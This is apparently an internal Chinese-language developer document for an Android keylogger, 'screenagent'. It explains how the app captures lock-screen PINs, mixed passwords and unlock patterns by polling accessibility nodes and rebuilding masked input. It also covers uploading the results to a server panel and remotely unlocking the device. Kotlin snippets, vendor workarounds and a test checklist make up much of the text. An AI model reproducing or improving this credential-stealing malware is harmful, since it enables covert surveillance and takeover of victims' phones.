# 锁屏 PIN / 图案采集（公共层）

采集逻辑在 `app/src/main/java/com/zaka/screenagent/keylog/`，**不分厂商**；只有引导流程才按厂商分目录（`flow/{miui,samsung,motorola}/`）。

## 为什么不能只靠"数字键点击"

不同 ROM 对无障碍事件的支持差别很大：

| ROM / 机型 | 数字键 `TYPE_VIEW_CLICKED` | 旧逻辑（顺序拼接）结果 |
|---|---|---|
| Samsung A13（SM-G981V） | 每个键都发 | 能拼出完整 PIN ✅ |
| Motorola Android 15（moto g power 5G 2024） | 只发一部分（6 位只收到 2~3 个） | 长度不足 4 → 被 `MIN_UNLOCK_LEN` 丢弃 ❌ |

所以 3.7 之后改成"掩码文本还原"为主路径，旧路径保留作兜底。

## 三条采集路径

| 顺序 | 路径 | 说明 |
|---|---|---|
| ① | 掩码文本按位置还原（主力） | 锁屏密码框会显示 `"1"` → `"•1"` → `"••22"` → `"•••2"`，把其中明文数字按位置存起来，解锁时拼成完整 PIN |
| ② | 数字键 CLICKED 顺序缓冲（兜底） | 三星等 ROM 走这条，行为与 2.2 一致 |
| ③ | 图案 readDots | 九宫格图案 |

## 关键实现点

```kotlin
// 40ms 轮询锁屏根节点，主动读密码框（事件会被 ROM 合并，轮询能补上 len=1/2 的瞬时状态）
val tick = object : Runnable {
    override fun run() {
        readDots(service.rootInActiveWindow)      // 图案
        readPinField(service.rootInActiveWindow)  // 密码框
        h.postDelayed(this, 40L)
    }
}
```

密码框识别（只看控件特征，不看厂商名）：

```kotlin
val isPwdField =
    cd.contains("密码") || cd.contains("PIN") || cd.contains("contraseña") ||
    cd.contains("Contraseña") || cd.contains("código") ||
    n.isPassword ||                                  // 控件属性，跨 ROM 通用
    st.any { it == '•' || it == '●' || it == '＊' || it == '·' }  // 掩码点样式
```

按位置还原：

```kotlin
// "••22" → 从末尾往前填：pos3='2', pos2='2'；配合更早的 "11" 得到 pos0,pos1
private fun onMaskedField(text: String) {
    pinLen = text.length
    var idx = text.length - 1
    for (ch in text.reversed()) {
        if (ch.isDigit()) { pinByPos[idx] = ch; idx-- } else break
    }
}
```

## 上报类型（面板白名单）

面板「锁屏密码」弹窗只认这些 `type`：

```
system（系统图案/密码）、pwd（系统PIN）、pwd2（混合密码）、
fake_pin / fake_pwd / fake_pattern、apppwd、locktype
```

所以 PIN 必须以 `type=pwd` 上报（`pin` 会被面板过滤掉，表现为"采集到了但面板不显示"）。

## 排查用

`PinCapture.VERBOSE_EVENTS = true` 时打印锁屏全部无障碍事件（tag `PinEvt`），只在调试构建里打开。

## 验收清单

```
1. 锁屏输入 PIN → 日志 PinCapture: captured pin(len=N) via=masked
2. 服务器 keylogs 最新一条：pkg=lockscreen, type=pwd, text=PIN
3. 面板「锁屏密码」出现一条「系统PIN」
4. 「一键解锁」可用（需灭屏 + 锁屏状态）
```

## 混合密码（字母 + 数字）

三星等 ROM 的混合密码框同样会"露最后一位明文"，而且明文可以是字母：

```
masked field=[q]       len=1   ← 第 1 位是字母 q
masked field=[•1]      len=2
masked field=[••2]     len=3
masked field=[•••3]    len=4
masked field=[••••4]   len=5
```

所以还原规则从"只收数字"改成"掩码点以外都当明文"：

```kotlin
private fun isMask(c: Char) = c == '•' || c == '●' || c == '＊' || c == '·' || c == '*'
text.forEachIndexed { i, c -> if (!isMask(c)) pinByPos[i] = c }
```

两个配套改动：

```
① 长度从 >1 突然掉到 1 = 新一次输入（PIN ↔ 混合密码切换要清空旧位置表）
② 解锁离开时，掩码快照也算"有内容" → 触发结算（否则混合密码没数字键缓冲，永远不上报）
```

上报类型自动区分：

```
含字母 → pwd2（面板「系统混合密码」）
纯数字 → pwd （面板「系统PIN」）
```

## V2 解锁的能力边界

```
图案           ✅ dispatchGesture 画线
纯数字 PIN     ✅ 逐个点数字键 + 点确定（需屏幕已亮）
混合密码       ❌ 未支持（点按逻辑只认数字键；锁屏 ACTION_SET_TEXT 被系统拒绝）
```
